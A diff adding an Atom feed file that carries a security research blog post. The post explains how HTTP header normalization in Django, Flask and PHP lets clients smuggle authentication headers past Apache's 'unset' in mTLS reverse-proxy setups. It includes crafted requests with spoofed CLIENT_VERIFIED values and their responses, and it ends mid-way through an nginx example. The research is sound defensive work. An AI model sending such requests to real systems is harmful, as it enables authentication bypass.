@@ -1,0 +1,1161 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://telekomsecurity.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="http://telekomsecurity.github.io//" rel="alternate" type="text/html" /><updated>2020-07-23T12:06:24+02:00</updated><id>http://telekomsecurity.github.io//feed.xml</id><title type="html">Telekom Security</title><subtitle>Telekom Security research and publications</subtitle><author><name>Telekom Security</name></author><entry><title type="html">Smuggling HTTP headers through reverse proxies</title><link href="http://telekomsecurity.github.io//2020/05/smuggling-http-headers-through-reverse-proxies.html" rel="alternate" type="text/html" title="Smuggling HTTP headers through reverse proxies" /><published>2020-05-15T00:00:00+02:00</published><updated>2020-05-15T00:00:00+02:00</updated><id>http://telekomsecurity.github.io//2020/05/smuggling-http-headers-through-reverse-proxies</id><content type="html" xml:base="http://telekomsecurity.github.io//2020/05/smuggling-http-headers-through-reverse-proxies.html">&lt;p&gt;Under some conditions, it is possible to smuggle HTTP headers through a reverse proxy, even if it was explicitly unset before. This is possible in some cases due to HTTP header normalization and parser differentials. Because HTTP headers are commonly used as way to pass authentication data to the backend (for example in mutual TLS scenarios), this can lead to critical vulnerabilities.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;In the following post, I will describe some theoretical and practical scenarios and how to abuse them. Some of these methods were used to bypass authentication for critical internal applications.&lt;/p&gt;
+
+&lt;p&gt;If you do not want to read the detailed description, there is &lt;a href=&quot;#recap&quot;&gt;Recap&lt;/a&gt; at the end of this post.&lt;/p&gt;
+
+&lt;h2 id=&quot;client-certificate-authentication-over-a-reverse-proxy&quot;&gt;Client certificate authentication over a reverse proxy&lt;/h2&gt;
+
+&lt;p&gt;During an audit of an internal platform, I took a deeper look at an authentication method we often use internally. This authentication is done via smartcard and offers a simple way for us to authenticate a user by his email address with a X509 client certificate. Because it’s available to a lot of employees, it is a fast and better way to authenticate than old username plus password.&lt;/p&gt;
+
+&lt;p&gt;The process is easy to implement on the first thought. Our internal guidelines, as well as a lot of popular resources on the Internet, use something like this:&lt;/p&gt;
+
+&lt;p&gt;1) A reverse proxy in front of the backend does the mutual TLS (mTLS) flow and ensures a valid client certificate.
+2) Some X509 fields like an email address or a full name are extracted from the certificate.
+3) The fields are added as additional headers and the request is forwarded to the backend.
+4) The backend authenticates the user (by the passed fields).&lt;/p&gt;
+
+&lt;p&gt;You see what can be a big problem here: Only some headers will separate an attacker from an authentication bypass (or some privilege escalation).&lt;/p&gt;
+
+&lt;p&gt;To prevent this, it is usually recommended to &lt;strong&gt;unset headers passed in the original request&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;This is an example configuration:&lt;/p&gt;
+
+&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *:443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# activate HTTPS on the reverse proxy&lt;/span&gt;
+    &lt;span class=&quot;nc&quot;&gt;SSLEngine&lt;/span&gt; On
+    &lt;span class=&quot;nc&quot;&gt;SSLCertificateFile&lt;/span&gt;    /etc/apache2/ssl/mycert.crt
+    &lt;span class=&quot;nc&quot;&gt;SSLCertificateKeyFile&lt;/span&gt; /etc/apache2/ssl/mycert.key
+
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /auth/cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# activate the client certificate authentication&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;SSLCACertificateFile&lt;/span&gt; /etc/apache2/ssl/client-accepted-ca-chain.crt
+        &lt;span class=&quot;nc&quot;&gt;SSLVerifyClient&lt;/span&gt; require
+        &lt;span class=&quot;nc&quot;&gt;SSLVerifyDepth&lt;/span&gt; 3
+
+        &lt;span class=&quot;c&quot;&gt;# enrich request with client certificate data&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;RequestHeader&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;set&lt;/span&gt; SSL_CLIENT_S_DN &quot;%{SSL_CLIENT_S_DN}s&quot;
+
+        &lt;span class=&quot;nc&quot;&gt;ProxyPass&lt;/span&gt;          http://localhost:8080/
+        &lt;span class=&quot;nc&quot;&gt;ProxyPassReverse&lt;/span&gt;   http://localhost:8080/
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So in theory, this looks pretty safe. But as you might have already guessed - it’s not (always). Let us first explore how normalization may result in unexpected behaviour.&lt;/p&gt;
+
+&lt;h2 id=&quot;normalization-attackers-best-friend&quot;&gt;Normalization, attacker’s best friend&lt;/h2&gt;
+
+&lt;p&gt;Depending on the combination of reverse proxy, backend software and even framework used, an attacker passed HTTP header will be normalized and may interfere with “filters” which are set in place.&lt;/p&gt;
+
+&lt;p&gt;For every following scenario, I will use the following Apache configuration. This will unset/remove the header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLIENT_VERIFIED&lt;/code&gt; and then pass the request to an application running at :1337.&lt;/p&gt;
+
+&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RequestHeader&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;unset&lt;/span&gt; CLIENT_VERIFIED
+
+&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;ProxyPass&lt;/span&gt;          http://localhost:1337/
+    &lt;span class=&quot;nc&quot;&gt;ProxyPassReverse&lt;/span&gt;   http://localhost:1337/
+&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Before diving into this, I was a bit surprised that what I tried even nearly worked. As can be read in a lot of posts and documentation, Apache and Nginx will &lt;em&gt;silently drop all headers with underscores&lt;/em&gt; in them. However I found some problems with this: This is &lt;strong&gt;not done when requests are passed via ProxyPass on Apache&lt;/strong&gt;. This seems to be overlooked by a lot of frameworks which &lt;a href=&quot;https://www.djangoproject.com/weblog/2015/jan/13/security/&quot;&gt;falsely document this behavior&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The &lt;a href=&quot;https://httpd.apache.org/docs/trunk/env.html#setting&quot;&gt;apache documentation&lt;/a&gt; states that this is happening when HTTP headers are passed via environment variables:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A special case are HTTP headers which are passed to CGI scripts and the like via environment variables (see below). They are converted to uppercase and only dashes are replaced with underscores; if the header contains any other (invalid) character, the whole header is silently dropped&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;apache-and-django-deployed-with-gunicorn&quot;&gt;Apache and django (deployed with gunicorn)&lt;/h3&gt;
+
+&lt;p&gt;In the backend I’ve setup a simple django application with the following code, which returns all
+headers:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{k}:{v}&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;META&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So with the configuration above, the following request will of course not pass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLIENT_VERIFIED&lt;/code&gt; to the backend, because Apache will unset it before:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;CLIENT_VERIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;pwn@pwn.com&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s take a step back first. How does django/python/gunicorn handle a HTTP request? Python usually does this over &lt;a href=&quot;https://wsgi.readthedocs.io/en/latest/what.html&quot;&gt;WSGI&lt;/a&gt;, a specification describing how a web server communicates with a web application. It’s derived from CGI times. As soon as CGI is (or was) involved, things get a bit strange. Because of how headers were passed in the CGI days as environment variables, there was a problem with hyphens (and underscores) in header names. This led to the decision to normalize these header values:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;When HTTP headers are placed into the WSGI environ, they are normalized by converting to uppercase, converting all dashes to underscores, and prepending HTTP_.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A header passed as “foo-bar” to a django app is therefore converted/normalized to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP_FOO_BAR&lt;/code&gt;. If you add 1 and 1 now, you should see how this will implicate our scenario:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/header-smuggling_apache2_django_gunicorn.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unset&lt;/code&gt; (or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set&lt;/code&gt; to an empty string) in the Apache config is therefore ineffective.&lt;/p&gt;
+
+&lt;p&gt;This conflation was already documented in a &lt;a href=&quot;https://www.djangoproject.com/weblog/2015/jan/13/security/&quot;&gt;security advisory by django&lt;/a&gt; some years ago. The mentioned fix (“In order to prevent such attacks, both Nginx and Apache 2.4+ strip all headers containing underscores from incoming requests by default.”) does not happen in a reverse proxied environment. However, even if this would be done, we are not using underscores in our request here, because they are converted to underscores anyway.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; This also works if apache unsets a hyphen header name (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLIENT-VERIFIED&lt;/code&gt;). You can then just pass the header with an underscore (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLIENT_VERIFIED&lt;/code&gt;) and django will happily convert it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP_CLIENT_VERIFIED&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;apache-and-flask-deployed-with-gunicorn&quot;&gt;Apache and flask (deployed with gunicorn)&lt;/h3&gt;
+
+&lt;p&gt;Flask (which makes use of &lt;a href=&quot;https://github.com/pallets/werkzeug&quot;&gt;werkzeug&lt;/a&gt;) has its own way of handling headers (and hyphens). The following code was used (in the flask app):&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{k}:{v}&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;header_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;is_authenticated&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'CLIENT_VERIFIED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{header_str}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{is_authenticated}&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This code will print out all headers and echo if there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLIENT_VERIFIED&lt;/code&gt; value passed (which - based on the Apache config - should not be possible).&lt;/p&gt;
+
+&lt;p&gt;Let’s give it a try:&lt;/p&gt;
+
+&lt;p&gt;Request:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/login_cst&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;CLIENT_VERIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;foobar&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Response:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Wed, 22 Apr 2020 18:16:07 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gunicorn/20.0.4&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html; charset=utf-8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;160&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Accept-Encoding&lt;/span&gt;
+
+Host:localhost:1337
+X-Forwarded-For:10.0.2.2
+X-Forwarded-Host:127.0.0.1
+X-Forwarded-Server:10.0.2.15
+Connection:Keep-Alive
+
+False
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see here, Flask (werkzeug) does its own normalization here, capitalizing each word and converting to hyphens.&lt;/p&gt;
+
+&lt;p&gt;Now let’s try to abuse this normalization and bypass the “authentication”:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/header-smuggling_apache2_flask_gunicorn.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can see here that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;is_authenticated&lt;/code&gt; returned a value. This is possible because werkzeug &lt;a href=&quot;https://github.com/pallets/werkzeug/blob/master/src/werkzeug/datastructures.py#L1358&quot;&gt;overwrites&lt;/a&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__getitem__&lt;/code&gt; method, replacing hyphens with underscores. This way, our smuggled header is now accessible at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request.headers.get('CLIENT_VERIFIED')&lt;/code&gt;. Great success!&lt;/p&gt;
+
+&lt;p&gt;I have to admit at this point that one of my own applications I wrote was vulnerable to exactly this attack. The main problem here is that (a) I accepted the auth headers in a middleware and therefore not under a specific path, and that (b) header normalization lead to bypassing of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unset&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; This method also works the other way around: If Apache unset’s a header like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FOO-BAR&lt;/code&gt;, we can just send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FOO_BAR&lt;/code&gt; which will be normalized and is then still accessible in flask with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request.headers.get('FOO-BAR')&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;apache-and-php&quot;&gt;Apache and PHP&lt;/h3&gt;
+
+&lt;p&gt;PHP does work the same way as django here, normalizing a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client-verified&lt;/code&gt; header and making it available under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_SERVER['HTTP_CLIENT_VERIFIED']&lt;/code&gt;. The backend is not able to distinguish if it was also originally sent as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLIENT_VERIFIED&lt;/code&gt; (from a potential reverse proxy) or directly from the client.&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/phpinfo.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;client-verified&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;pwned@pwned.com&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;e&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;$_SERVER['HTTP_CLIENT_VERIFIED']&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;v&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;pwned@pwned.com&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;intentionally-duplicating-headers&quot;&gt;Intentionally duplicating headers&lt;/h2&gt;
+
+&lt;p&gt;There is also some interesting behaviour when the reverse proxy sets a header (for example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_Test&lt;/code&gt;) and the clients chooses a header name which will be the same, after normalization: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL-Test&lt;/code&gt;. After normalization, this header will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_TEST&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;When doing this with Apache and flask/django, the headers are concatenated - with the client header first:&lt;/p&gt;
+
+&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *:443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# [...]&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;RequestHeader&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;set&lt;/span&gt; SSL_Test &quot;some@user.com&quot;
+
+        &lt;span class=&quot;nc&quot;&gt;ProxyPass&lt;/span&gt; http://localhost:1337/
+        &lt;span class=&quot;nc&quot;&gt;ProxyPassReverse&lt;/span&gt; http://localhost:1337/
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The result (in this example from django):
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP_SSL_TEST:foobar,some@user.com&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, the client value is prepended. While I have to agree that its not very promising in this situation, this may become handy when adding a value to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-Host&lt;/code&gt;, etc. which is set by Apache by default:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/header-smuggling_apache2_forwarded_for.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now let’s take the following nginx configuration, where the result looks a bit more promising:&lt;/p&gt;
+
+&lt;div class=&quot;language-nginx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kn&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;default_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;kn&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/foo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
